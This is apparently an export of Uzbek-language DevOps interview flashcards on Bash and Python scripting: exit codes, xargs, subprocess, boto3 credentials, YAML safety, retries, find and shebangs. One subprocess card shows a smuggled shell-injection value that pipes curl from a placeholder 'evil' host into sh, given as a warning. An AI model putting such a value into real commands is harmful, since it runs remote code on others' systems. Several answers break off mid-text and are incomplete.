.metadata.name' all.yaml<br><br># YAML -&gt; JSON<br>yq -o=json deployment.yaml | jq .<br><br># O'zgarishni avval ko'rish<br>yq '.spec.replicas = 5' deployment.yaml | diff deployment.yaml - || true</pre><p><b>Tuzoqlar:</b></p><ul><li>Qiymatni string qo'shish bilan berish (<code>&quot;.image = \&quot;$TAG\&quot;&quot;</code>) — injection va escape muammosi; <code>strenv()</code>/<code>env()</code> ishlating.</li><li><code>yes</code>, <code>no</code>, <code>on</code>, <code>1.10</code> kabi qiymatlar tip o'zgarishi mumkin (<code>1.10</code> -&gt; float <code>1.1</code>); string bo'lsin desangiz tirnoqlang.</li><li>Python <code>yq</code> va Go <code>yq</code> ni adashtirish — CI image'da qaysi biri ekanini pin qiling.</li></ul><p><b>Senior nuqta:</b> Ko'p muhitli manifest'larni <code>yq</code> bilan patch qilish tez kichik yechim; tizimli ish uchun Kustomize (<code>images:</code> transformer) yoki Helm values ishonchliroq va review qilish oson.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40006	<p>Bash'da <code>[[ ... ]]</code> va <code>[ ... ]</code> farqi.</p>	<p><b>Qisqa javob:</b> <code>[ ... ]</code> — POSIX <code>test</code> buyrug'i (oddiy buyruq, argumentlari word splitting'dan o'tadi). <code>[[ ... ]]</code> — Bash keyword: tirnoqsiz o'zgaruvchi xavfsiz, <code>&amp;&amp;</code>/<code>||</code>, glob (<code>==</code>) va regex (<code>=~</code>) qo'llaydi.</p><p><b>Muammo:</b> <code>[ $env = prod ]</code> — <code>env</code> bo'sh bo'lsa <code>[ = prod ]</code> bo'lib &quot;unary operator expected&quot; xato beradi; <code>env=&quot;a b&quot;</code> bo'lsa &quot;too many arguments&quot;. Bunday xato prod'da faqat ma'lum input bilan chiqadi.</p><p><b>Qanday ishlaydi:</b></p><pre>[ $x = y ]   -&gt; shell avval $x ni ochadi, bo'laklaydi -&gt; keyin test ga beradi<br>[[ $x = y ]] -&gt; parser ifodani butun ko'radi, $x bo'laklanmaydi</pre><p>| | <code>[ ]</code> | <code>[[ ]]</code> | |---|---|---| | POSIX (sh, dash) | ha | yo'q (bash/zsh/ksh) | | Tirnoqsiz <code>$x</code> | xavfli | xavfsiz | | AND/OR | <code>-a</code>/<code>-o</code> (eskirgan) yoki <code>] &amp;&amp; [</code> | <code>&amp;&amp;</code>, <code>\|\|</code> | | Pattern | yo'q | <code>== *.log</code> | | Regex | yo'q | <code>=~</code> | | <code>&lt;</code>, <code>&gt;</code> | escape kerak (<code>\&lt;</code>) | to'g'ridan |</p><p><b>Amalda:</b></p><pre>file=&quot;my report.log&quot;<br>[[ -f $file &amp;&amp; $file == *.log ]] &amp;&amp; echo &quot;log fayl&quot;<br><br>if [[ $ver =~ ^v([0-9]+)\.([0-9]+)$ ]]; then<br>  echo &quot;major=${BASH_REMATCH[1]} minor=${BASH_REMATCH[2]}&quot;<br>fi<br><br># POSIX sh uchun (masalan Alpine /bin/sh):<br>if [ -n &quot;$env&quot; ] &amp;&amp; [ &quot;$env&quot; = &quot;prod&quot; ]; then echo prod; fi<br><br># Son solishtirish:<br>(( count &gt; 10 )) &amp;&amp; echo ko'p</pre><p><b>Tuzoqlar:</b></p><ul><li><code>#!/bin/sh</code> skriptda <code>[[</code> — Debian/Alpine'da <code>dash</code>/<code>ash</code> uni bilmaydi: &quot;[[: not found&quot;.</li><li><code>[[ $a == &quot;$b&quot; ]]</code> — o'ng tomon tirnoqli bo'lsa literal, tirnoqsiz bo'lsa glob pattern.</li><li>Regex'ni tirnoqlash (<code>=~ &quot;^[0-9]+$&quot;</code>) uni literal string qiladi; regex'ni o'zgaruvchiga solib tirnoqsiz ishlating.</li></ul><p><b>Senior nuqta:</b> Bash skriptda doim <code>[[ ]]</code> va <code>(( ))</code>; faqat POSIX sh (container entrypoint, initramfs) uchun <code>[ ]</code> + har doim tirnoq. Shebang va ishlatilgan sintaksis mos ekanini <code>shellcheck</code> tekshiradi.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40007	<p>Linux / Bash'ning keng tarqalgan exit code'larini tushuntiring.</p>	<p><b>Qisqa javob:</b> Exit code — jarayon tugaganda qaytaradigan 0-255 son. <code>0</code> = muvaffaqiyat, qolgani xato. 126/127 — buyruqni ishga tushirib bo'lmadi, 128+N — N raqamli signal bilan o'ldirildi (137 = 128+9 SIGKILL).</p><p><b>Muammo:</b> CI job yoki Kubernetes pod &quot;Exit code 137&quot; bilan yiqildi. Bu kod xatosi emas — jarayon tashqaridan o'ldirilgan (ko'pincha OOM). Kodni bilmasangiz noto'g'ri joyni debug qilasiz.</p><p><b>Qanday ishlaydi:</b></p><pre>0        muvaffaqiyat<br>1        umumiy xato (dastur o'zi tanlaydi)<br>2        builtin noto'g'ri ishlatilgan / usage xato (grep: fayl yo'q)<br>126      topildi, lekin bajarib bo'lmaydi (chmod -x, noexec mount)<br>127      buyruq topilmadi (PATH, typo, image'da yo'q)<br>128+N    N signal bilan tugadi:<br>  130    SIGINT  (2)  - Ctrl+C<br>  137    SIGKILL (9)  - kill -9, OOM killer, K8s grace tugadi<br>  139    SIGSEGV (11) - segfault<br>  143    SIGTERM (15) - graceful stop (docker stop, K8s)<br>255      exit -1 yoki diapazondan tashqari (ssh: ulanish xatosi)</pre><p><b>Amalda:</b></p><pre>some_cmd; echo &quot;rc=$?&quot;<br>kill -l 137        # -&gt; KILL  (128 dan yuqori kodni signal nomiga)<br><br># Pipeline'dagi har bir status<br>false | true; echo &quot;${PIPESTATUS[@]}&quot;   # 1 0<br><br># Kubernetes<br>kubectl get pod app-x -o jsonpath='{.status.containerStatuses[0].lastState.terminated}'<br># {&quot;exitCode&quot;:137,&quot;reason&quot;:&quot;OOMKilled&quot;...}<br><br># O'z skriptingizda ma'noli kodlar<br>[[ -f &quot;$cfg&quot; ]] || { echo &quot;config yo'q&quot; &gt;&amp;2; exit 2; }</pre><p><b>Tuzoqlar:</b></p><ul><li><code>exit 256</code> -&gt; 0 bo'lib qoladi (mod 256); kodlar 0-255.</li><li>137 har doim OOM emas — <code>reason: OOMKilled</code> va <code>dmesg | grep -i oom</code> bilan tasdiqlang.</li><li><code>echo $?</code> dan oldin boshqa buyruq yozsangiz <code>$?</code> yangilanadi — darhol saqlang: <code>rc=$?</code>.</li></ul><p><b>Senior nuqta:</b> O'z tool'laringizda exit code'ni kontrakt sifatida hujjatlang (masalan 0 OK, 1 xato, 2 usage, 3 &quot;o'zgarish bor&quot; — <code>terraform plan -detailed-exitcode</code> kabi). Alerting va CI shu kodlarga qarab qaror qiladi.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40008	<p>Bash'da <code>xargs</code> bilan buyruqlarni parallel qanday ishga tushirasiz?</p>	<p><b>Qisqa javob:</b> <code>xargs -P N</code> stdin'dan kelgan argumentlarni bo'lib, bir vaqtda N tagacha jarayon ishga tushiradi. <code>-n 1</code> — har jarayonga bitta argument, <code>-I{}</code> — argumentni buyruq ichidagi joyga qo'yadi, <code>-0</code> — null-ajratilgan input.</p><p><b>Muammo:</b> 500 ta URL'ni yuklab olish kerak. Ketma-ket <code>curl</code> 500 x 1s = 8 daqiqa. Parallel 8 ta bilan ~1 daqiqa. Lekin cheklovsiz <code>&amp;</code> bilan 500 ta jarayon ochish server/API'ni yiqitadi — <code>-P</code> bounded concurrency beradi.</p><p><b>Qanday ishlaydi:</b></p><pre>urls.txt -&gt; xargs -P 4 -n 1 curl -O<br>           slot1: curl url1  -&gt; tugadi -&gt; curl url5<br>           slot2: curl url2  -&gt; tugadi -&gt; curl url6<br>           slot3: curl url3  ...<br>           slot4: curl url4  ...<br>   (har doim maksimal 4 ta jarayon)</pre><p><b>Amalda:</b></p><pre># 4 parallel yuklab olish<br>xargs -n 1 -P 4 curl -fsSO &lt; urls.txt<br><br># Har host'da buyruq, chiqishga host nomi bilan<br>xargs -I{} -P 10 sh -c 'echo &quot;[{}] $(ssh -o ConnectTimeout=5 {} uptime)&quot;' &lt; hosts.txt<br><br># Bo'shliqli fayl nomlari bilan xavfsiz<br>find /data -name '*.csv' -print0 | xargs -0 -P &quot;$(nproc)&quot; -n 1 gzip<br><br># Avval nima bajarilishini ko'rish<br>xargs -t -n 1 echo rm &lt; files.txt</pre><p>Exit code: biror chaqiruv 1-125 qaytarsa xargs 123 qaytaradi — CI xatoni sezadi.</p><p><b>Tuzoqlar:</b></p><ul><li><code>-0</code>/<code>-print0</code> siz bo'shliq yoki newline'li fayl nomlari bo'laklanadi.</li><li>Parallel jarayonlar chiqishi aralashib ketadi; har biri o'z log fayliga yozsin yoki GNU <code>parallel</code> (<code>--tag</code>, <code>--keep-order</code>) ishlating.</li><li><code>-I{}</code> + <code>sh -c &quot;... {} ...&quot;</code> — fayl nomida <code>$(...)</code> bo'lsa injection; argumentni <code>sh -c '...' _ {}</code> orqali <code>$1</code> sifatida uzating.</li></ul><p><b>Senior nuqta:</b> <code>-P</code> qiymatini resursga qarab tanlang: CPU-bound — <code>nproc</code>, tarmoq/API — API rate limit'iga qarab. Retry, progress va natija tartibi kerak bo'lsa GNU <code>parallel</code> yoki Python <code>ThreadPoolExecutor</code> to'g'riroq tanlov.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40009	<p>Nega DevOps automation skriptlari uchun Python <code>venv</code> majburiy?</p>	<p><b>Qisqa javob:</b> <code>venv</code> har loyihaga alohida Python paketlar papkasini beradi. Shu bilan tool'lar orasidagi versiya konflikti va system Python'ni buzish oldi olinadi. Zamonaviy distrolar (Debian 12+, Ubuntu 23.04+) PEP 668 bo'yicha global <code>pip install</code> ni bloklaydi (<code>externally-managed-environment</code>).</p><p><b>Muammo:</b> Serverda <code>sudo pip install requests==2.x</code> qildingiz — bu <code>apt</code> o'rnatgan <code>python3-requests</code> ni almashtirdi va <code>unattended-upgrades</code> yoki <code>cloud-init</code> buzildi. Server'dagi ops tool'lar uchun <code>pipx</code>/<code>uv tool</code>, loyihalar uchun <code>uv</code> + lock fayl — eng takrorlanadigan yo'l.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40010	<p><code>boto3</code> nima va uning credential aniqlash ierarxiyasi qanday?</p>	<p><b>Qisqa javob:</b> <code>boto3</code> — AWS'ning rasmiy Python SDK'si. Credential'larni &quot;provider chain&quot; bo'yicha qidiradi va birinchi topilganini ishlatadi: kodda berilgan -&gt; env -&gt; profile/config fayllar -&gt; container/web identity -&gt; EC2 instance metadata.</p><p><b>Muammo:</b> Lokal kompyuterda ishlagan skript EC2'da &quot;AccessDenied&quot; beradi yoki aksincha noto'g'ri akkauntga yozadi — chunki kutilmagan manbadan (eski <code>AWS_ACCESS_KEY_ID</code> env) credential olingan. Zanjirni bilish debug'ni tezlashtiradi.</p><p><b>Qanday ishlaydi (soddalashtirilgan tartib):</b></p><pre>1. boto3.client(..., aws_access_key_id=...) yoki Session(...) parametrlari<br>2. Env: AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN<br>3. Assume role provider (~/.aws/config: role_arn + source_profile)<br>4. Web identity (AWS_WEB_IDENTITY_TOKEN_FILE + AWS_ROLE_ARN) -&gt; IRSA (EKS)<br>5. IAM Identity Center / SSO (aws sso login)<br>6. ~/.aws/credentials  (AWS_PROFILE yoki [default])<br>7. ~/.aws/config<br>8. Container provider (ECS task role, EKS Pod Identity)<br>9. Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40011	<p><code>boto3.client</code> va <code>boto3.resource</code> farqi.</p>	<p><b>Qisqa javob:</b> <code>client</code> — AWS API'ga 1:1 past darajali interfeys, dict qaytaradi va hamma servislarni qo'llaydi. <code>resource</code> — obyektga yo'naltirilgan yuqori qatlam (<code>s3.Bucket(...)</code>), lekin AWS uni &quot;feature freeze&quot; qilgan: yangi servis va funksiyalar qo'shilmaydi. Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40013	<p>Python'da <code>os.system()</code>, <code>subprocess.run()</code> va <code>subprocess.Popen()</code> farqi.</p>	<p><b>Qisqa javob:</b> <code>os.system()</code> — buyruqni shell orqali ishga tushiradi, faqat exit status qaytaradi, chiqishni ushlamaydi; eskirgan. <code>subprocess.run()</code> — ishga tushiradi va tugashini kutadi, stdout/stderr/returncode beradi; default tanlov. <code>Popen()</code> — past darajali, bloklamaydi: real-time stream, pipe zanjiri, uzoq jarayon boshqaruvi uchun.</p><p><b>Muammo:</b> <code>os.system(f&quot;rm -rf {path}&quot;)</code> — <code>path=&quot;x; curl evil|sh&quot;</code> bo'lsa shell injection. Shuningdek <code>os.system</code> xatoni jim o'tkazib yuboradi va natijani olish uchun vaqtinchalik fayl kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>os.system(str)       -&gt; /bin/sh -c str -&gt; exit status (int, encoded)<br>run([args], ...)     -&gt; fork/exec (shell yo'q) -&gt; kutadi -&gt; CompletedProcess<br>Popen([args], ...)   -&gt; fork/exec -&gt; darhol qaytadi -&gt; .stdout o'qish, .wait(), .poll()</pre><p><b>Amalda:</b></p><pre>import subprocess<br><br># run: oddiy holat<br>r = subprocess.run([&quot;kubectl&quot;, &quot;get&quot;, &quot;pods&quot;, &quot;-o&quot;, &quot;name&quot;],<br>                   capture_output=True, text=True, check=True, timeout=30)<br>pods = r.stdout.splitlines()<br><br># Xato bilan ishlash<br>try:<br>    subprocess.run([&quot;systemctl&quot;, &quot;restart&quot;, &quot;nginx&quot;], check=True, timeout=60)<br>except subprocess.CalledProcessError as e:<br>    print(&quot;rc&quot;, e.returncode, e.stderr)<br>except subprocess.TimeoutExpired:<br>    print(&quot;qotib qoldi&quot;)<br><br># Popen: uzoq jarayon chiqishini real vaqtda o'qish<br>with subprocess.Popen([&quot;terraform&quot;, &quot;apply&quot;, &quot;-auto-approve&quot;],<br>                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT,<br>                      text=True, bufsize=1) as p:<br>    for line in p.stdout:<br>        print(&quot;[tf]&quot;, line, end=&quot;&quot;)<br>rc = p.returncode</pre><p><b>Tuzoqlar:</b></p><ul><li><code>shell=True</code> + foydalanuvchi input = injection. Agar Python'da shu ishni kutubxona qilsa (<code>boto3</code>, <code>kubernetes</code> client) — subprocess'dan ko'ra API ishlating: tipli xatolar, parse yo'q.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40014	<p>Python'da environment o'zgaruvchilarni qanday xavfsiz o'qiysiz?</p>	<p><b>Qisqa javob:</b> Majburiy qiymatni <code>os.environ[&quot;X&quot;]</code> bilan o'qing — yo'q bo'lsa startda <code>KeyError</code> bilan yiqiladi (fail fast). Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40015	<p>Python'da <code>PyYAML</code> bilan YAML'ni qanday xavfsiz o'qib-yozasiz?</p>	<p><b>Qisqa javob:</b> Har doim <code>yaml.safe_load()</code> — u faqat oddiy tiplarni (dict, list, str, int...) yaratadi. <code>yaml.load()</code> (<code>Loader=UnsafeLoader</code>/<code>FullLoader</code> bilan) <code>!!python/object</code> teglari orqali ixtiyoriy Python obyekt va kod bajarilishiga yo'l ochadi. Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40016	<p>Python'da exponential backoff bilan retry qanday qilinadi?</p>	<p><b>Qisqa javob:</b> Exponential backoff — har urinishdan keyin kutishni ikki baravar oshirish (1s, 2s, 4s, 8s...) va maksimal chegara qo'yish. Jitter (tasodifiy siljish) qo'shiladi, faqat vaqtinchalik xatolar (timeout, 429, 5xx) qayta uriniladi. Python'da <code>tenacity</code> kutubxonasi yoki <code>urllib3.Retry</code>.</p><p><b>Muammo:</b> API 2 soniya ishlamay qoldi. Retry'siz skript yiqiladi. Oddiy <code>while True</code> retry esa — 1000 ta client bir vaqtda qayta urinib &quot;thundering herd&quot; bilan servisni tiklanishiga yo'l qo'ymaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>urinish 1 -&gt; xato -&gt; kut ~1s (+jitter)<br>urinish 2 -&gt; xato -&gt; kut ~2s<br>urinish 3 -&gt; xato -&gt; kut ~4s<br>urinish 4 -&gt; xato -&gt; kut ~8s (max 10s)<br>urinish 5 -&gt; xato -&gt; taslim, exception<br>kutish = min(max, base * 2^n) * random(0..1)   (full jitter)</pre><p><b>Amalda:</b></p><pre>import requests<br>from tenacity import (retry, stop_after_attempt, wait_random_exponential,<br>                      retry_if_exception, before_sleep_log)<br>import logging<br>log = logging.getLogger(__name__)<br><br>def is_transient(e: Exception) -&gt; bool:<br>    if isinstance(e, (requests.ConnectionError, requests.Timeout)):<br>        return True<br>    if isinstance(e, requests.HTTPError):<br>        return e.response.status_code in (429, 502, 503, 504)<br>    return False<br><br>@retry(stop=stop_after_attempt(5),<br>       wait=wait_random_exponential(multiplier=1, max=10),<br>       retry=retry_if_exception(is_transient),<br>       before_sleep=before_sleep_log(log, logging.WARNING),<br>       reraise=True)<br>def fetch(url: str):<br>    r = requests.get(url, timeout=5)<br>    r.raise_for_status()<br>    return r.json()</pre><p>Kutubxonasiz variant: <code>urllib3.util.Retry(total=5, backoff_factor=1, status_forcelist=[429,502,503,504])</code> ni <code>HTTPAdapter</code> orqali <code>Session</code> ga ulash.</p><p><b>Tuzoqlar:</b></p><ul><li>400/401/404 ni retry qilish — bu xato qayta urinish bilan tuzalmaydi.</li><li>POST kabi idempotent bo'lmagan so'rovni retry qilish — dublikat to'lov/resurs. Idempotency key ishlating.</li><li>Jitter'siz backoff — barcha client'lar sinxron qayta uradi.</li><li><code>Retry-After</code> header'ini e'tiborsiz qoldirish (429 da).</li></ul><p><b>Senior nuqta:</b> Retry'ni faqat bitta qatlamda qiling — client, gateway va service mesh har biri 3 marta retry qilsa 27x yuk. Umumiy vaqt budjeti (deadline) va circuit breaker bilan birga ishlating.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40017	<p>Tashqi tool'larsiz Bash'da masofaviy serverdagi port ochiqligini qanday tekshirasiz?</p>	<p><b>Qisqa javob:</b> Bash'ning ichki <code>/dev/tcp/HOST/PORT</code> psevdo-yo'li orqali: Bash unga yo'naltirishni ko'rganda TCP ulanish ochadi. Ulanish muvaffaqiyatli bo'lsa port ochiq. <code>timeout</code> bilan o'rang, aks holda filtrlangan port'da uzoq kutib qoladi.</p><p><b>Muammo:</b> Minimal container image'da (distroless, slim) <code>nc</code>, <code>telnet</code>, <code>nmap</code> yo'q, lekin DB ga ulanish bormi tekshirish kerak — masalan entrypoint'da &quot;Postgres tayyor bo'lguncha kut&quot;.</p><p><b>Qanday ishlaydi:</b></p><pre>bash: exec 3&lt;&gt;/dev/tcp/10.0.0.1/5432<br>   -&gt; bash connect() syscall<br>   -&gt; SYN -&gt; SYN/ACK : ochiq  -&gt; rc 0<br>   -&gt; RST            : yopiq  -&gt; &quot;Connection refused&quot;, rc 1<br>   -&gt; javob yo'q     : firewall DROP -&gt; timeout bilan to'xtaydi (rc 124)</pre><p>Bu fayl tizimida haqiqiy fayl emas — faqat Bash'ning o'zi tushunadi (<code>sh</code>/<code>dash</code> da ishlamaydi).</p><p><b>Amalda:</b></p><pre>check_port() {<br>  local host=$1 port=$2<br>  if timeout 2 bash -c &quot;&lt;/dev/tcp/${host}/${port}&quot; 2&gt;/dev/null; then<br>    echo &quot;OPEN   ${host}:${port}&quot;<br>  else<br>    echo &quot;CLOSED ${host}:${port} (rc=$?)&quot;<br>  fi<br>}<br>check_port 10.0.0.1 5432<br><br># Servis tayyor bo'lguncha kutish (max 60s)<br>for i in $(seq 1 30); do<br>  timeout 2 bash -c &quot;&lt;/dev/tcp/db/5432&quot; 2&gt;/dev/null &amp;&amp; break<br>  echo &quot;db kutilmoqda ($i)&quot;; sleep 2<br>done<br><br># Oddiy HTTP so'rov ham mumkin<br>exec 3&lt;&gt;/dev/tcp/example.com/80<br>printf 'HEAD / HTTP/1.0\r\nHost: example.com\r\n\r\n' &gt;&amp;3<br>head -1 &lt;&amp;3; exec 3&gt;&amp;-</pre><p><b>Tuzoqlar:</b></p><ul><li><code>#!/bin/sh</code> da ishlamaydi — faqat bash (ba'zi distro'larda compile vaqtida o'chirilgan ham bo'lishi mumkin).</li><li>Port ochiq != servis sog'lom. TCP ulanish bor, lekin Postgres hali recovery'da bo'lishi mumkin; <code>pg_isready</code> yoki health endpoint aniqroq.</li><li><code>timeout</code> siz DROP qilingan port'da ~2 daqiqa kutish (TCP SYN retry).</li></ul><p><b>Senior nuqta:</b> Kubernetes'da &quot;kutish&quot; skriptlari o'rniga readiness probe va ilovada retry'li ulanish yaxshiroq; init container faqat haqiqiy qat'iy bog'liqlik uchun. <code>/dev/tcp</code> — debug va minimal image uchun foydali hiyla.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40018	<p>Linux'da N kundan eski fayllarni qanday topib o'chirasiz?</p>	<p><b>Qisqa javob:</b> <code>find PATH -type f -name '*.log' -mtime +N -delete</code> — o'zgartirilgan vaqti N*24 soatdan eski fayllarni topib o'chiradi. Avval <code>-delete</code> siz (yoki <code>-print</code>) ishga tushirib ro'yxatni tekshiring.</p><p><b>Muammo:</b> <code>/var/log/app</code> har kuni 2 GB o'sadi, disk 100% bo'ldi va servis yiqildi. Avtomatik tozalash kerak — lekin noto'g'ri <code>find</code> butun papkani o'chirib yuborishi mumkin.</p><p><b>Qanday ishlaydi:</b></p><pre>-mtime +14  : mtime (kontent o'zgargan vaqt) &gt;= 15 to'liq kun oldin<br>              (find kunlarni butun songa yaxlitlaydi: +14 =&gt; 14 dan KO'P)<br>-mtime -1   : oxirgi 24 soat ichida<br>-mmin +60   : 60 daqiqadan eski<br>-delete     : o'chiradi (o'zi -depth ni yoqadi)</pre><p><b>Amalda:</b></p><pre># 1. Quruq ishga tushirish — nima o'chishini ko'rish<br>find /var/log/app -type f -name '*.log' -mtime +14 -print<br><br># 2. Hajmi bilan<br>find /var/log/app -type f -name '*.log' -mtime +14 -printf '%TY-%Tm-%Td %s %p\n'<br><br># 3. O'chirish<br>find /var/log/app -type f -name '*.log' -mtime +14 -delete<br><br># 4. Faqat shu papka (ichki papkalarga kirmasin), bo'sh papkalarni ham tozalash<br>find /var/backups -maxdepth 1 -type f -name '*.tar.gz' -mtime +7 -delete<br>find /var/backups -mindepth 1 -type d -empty -delete<br><br># 5. Eng so'nggi 5 tasini qoldirib qolganini o'chirish (vaqtdan qat'iy nazar)<br>ls -1t /var/backups/*.tar.gz | tail -n +6 | xargs -r rm -f</pre><p><b>Tuzoqlar:</b></p><ul><li><code>-delete</code> ni boshqa shartlardan OLDIN yozish (<code>find /x -delete -name '*.log'</code>) — hamma narsani o'chiradi. Tartib muhim.</li><li>O'zgaruvchi bo'sh bo'lsa <code>find &quot;$DIR/&quot; ...</code> -&gt; <code>find / ...</code>; <code>${DIR:?}</code> bilan himoyalang.</li><li>Ilova hali ochib turgan log faylni o'chirish — disk bo'shamaydi (<code>lsof +L1</code> bilan ko'rinadi); log'lar uchun <code>logrotate</code> to'g'ri vosita.</li></ul><p><b>Senior nuqta:</b> Log rotatsiya uchun <code>logrotate</code>/journald limitlari, backup retention uchun backup tool siyosati (yoki S3 lifecycle) ishlating — qo'lda <code>find</code> cron oxirgi chora. Har qanday o'chiruvchi job'ga dry-run rejimi va log qo'shing.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40019	<p><code>awk</code>, <code>sed</code> va <code>grep</code> farqi.</p>	<p><b>Qisqa javob:</b> <code>grep</code> — qatorlarni pattern bo'yicha <b>filtrlaydi</b>. <code>sed</code> — oqimdagi matnni <b>o'zgartiradi</b> (almashtirish, o'chirish, qo'shish). <code>awk</code> — qatorlarni <b>ustunlarga bo'lib</b>, hisoblash va shartli mantiq bajaradigan kichik til.</p><p><b>Muammo:</b> Nginx access log'idan 5xx xatolarni topish (grep), konfig fayldagi host'ni almashtirish (sed), har IP bo'yicha so'rovlar sonini hisoblash (awk) — uchala vazifa uchun to'g'ri vositani tanlash skriptni qisqa va tez qiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>matn -&gt; grep  : qator mos keldimi? ha -&gt; chiqar<br>matn -&gt; sed   : har qatorga buyruq (s///, d, i) -&gt; o'zgargan qatorni chiqar<br>matn -&gt; awk   : qatorni $1 $2 ... ga bo'l -&gt; pattern { action } -&gt; END { natija }</pre><p><b>Amalda:</b></p><pre># grep: filtrlash<br>grep -E ' (5[0-9]{2}) ' access.log          # 5xx qatorlar<br>grep -rn 'TODO' --include='*.py' src/       # rekursiv, qator raqami bilan<br>grep -c ERROR app.log                       # sonini sanash<br>grep -v '^#' nginx.conf | grep -v '^$'      # izoh va bo'sh qatorlarsiz<br><br># sed: o'zgartirish<br>sed -i.bak 's/db-old\.local/db-new.local/g' app.ini   # .bak zaxira bilan<br>sed -n '100,120p' big.log                   # faqat 100-120 qatorlar<br>sed '/^#/d' config                          # izohlarni o'chirish<br><br># awk: ustun va hisob<br>awk '{print $1}' access.log | sort | uniq -c | sort -rn | head   # top IP<br>awk '$9 &gt;= 500 {n++} END {print n+0, &quot;ta 5xx&quot;}' access.log<br>awk -F: '$3 &gt;= 1000 {print $1}' /etc/passwd   # oddiy foydalanuvchilar</pre><p><b>Tuzoqlar:</b></p><ul><li><code>sed -i</code> macOS (BSD) da <code>sed -i '' 's/a/b/'</code> talab qiladi — skript ko'chmasligi.</li><li><code>sed</code> regex'ida <code>/</code> va <code>.</code> escape kerak; ajratuvchini almashtiring: <code>s|/old/path|/new/path|g</code>.</li><li><code>cat file | grep</code> — ortiqcha jarayon; <code>grep pattern file</code>.</li><li>awk default ajratuvchisi bo'shliq; CSV'da qo'shtirnoqli vergullarni to'g'ri bo'lmaydi.</li></ul><p><b>Senior nuqta:</b> Pipeline 3-4 bosqichdan oshsa va ma'lumot strukturali (JSON, CSV) bo'lsa — <code>jq</code>, <code>mlr</code> yoki Python ishlating. Katta log'larda <code>grep -F</code> (fixed string) va <code>LC_ALL=C</code> tezlikni sezilarli oshiradi.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40020	<p>Shebang (<code>#!/usr/bin/env bash</code>) nima?</p>	<p><b>Qisqa javob:</b> Shebang — fayl birinchi qatoridagi <code>#!interpreter</code>. <code>./script</code> ishga tushirilganda kernel (<code>execve</code>) shu qatorni o'qib, ko'rsatilgan interpreter'ni fayl yo'li bilan ishga tushiradi. <code>#!/usr/bin/env bash</code> — <code>bash</code> ni <code>$PATH</code> dan qidiradi, shuning uchun turli tizimlarda ko'chma.</p><p><b>Muammo:</b> macOS'da <code>/bin/bash</code> 3.2 (eski), yangi bash <code>/opt/homebrew/bin/bash</code> da; NixOS/FreeBSD'da <code>/bin/bash</code> umuman yo'q. Qattiq yo'l bu tizimlarda &quot;bad interpreter&quot; beradi.</p><p><b>Qanday ishlaydi:</b></p><pre>./deploy.sh<br>  -&gt; kernel: fayl boshida &quot;#!&quot; bormi?<br>  -&gt; ha: &quot;/usr/bin/env bash&quot; ni o'qiydi<br>  -&gt; exec /usr/bin/env bash ./deploy.sh arg1 arg2<br>  -&gt; env PATH'dan bash'ni topib ishga tushiradi<br>Agar shebang yo'q: joriy shell o'zi interpret qilishga urinadi (sh)<br>`bash deploy.sh` deb chaqirilsa shebang e'tiborsiz qoldiriladi.</pre><p><b>Amalda:</b></p><pre>#!/usr/bin/env bash          # ko'chma, keng tarqalgan<br>#!/bin/sh                    # POSIX sh (dash/ash) — bash sintaksisisiz<br>#!/usr/bin/env python3<br>#!/usr/bin/env -S python3 -u # Linux env -S: bir nechta argument<br><br>chmod +x deploy.sh<br>./deploy.sh<br><br>head -1 deploy.sh            # qaysi interpreter<br>file deploy.sh               # &quot;Bourne-Again shell script...&quot;</pre><p><b>Tuzoqlar:</b></p><ul><li>Windows'da saqlangan fayl: <code>#!/usr/bin/env bash\r</code> -&gt; &quot;bash\r: No such file or directory&quot;. <code>dos2unix</code> yoki <code>.gitattributes</code> da <code>*.sh text eol=lf</code>.</li><li><code>#!/usr/bin/env bash -e</code> Linux'da ishlamaydi (kernel butun qatorni bitta argument qiladi); <code>set -e</code> ni ichida yozing.</li><li><code>#!/bin/sh</code> deb yozib bash xususiyatlarini (<code>[[</code>, massiv) ishlatish — Debian/Alpine'da buziladi.</li><li><code>noexec</code> bilan mount qilingan papkada (<code>/tmp</code>) <code>./script</code> &quot;Permission denied&quot;.</li></ul><p><b>Senior nuqta:</b> <code>env</code> PATH'ga bog'liq — root cron yoki minimal muhitda PATH boshqacha bo'lishi mumkin. Xavfsizlik muhim (setuid emas, lekin root ishlatadigan) tizim skriptlarida aniq yo'l (<code>#!/bin/bash</code>) ham asosli tanlov; muhimi jamoada izchillik.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
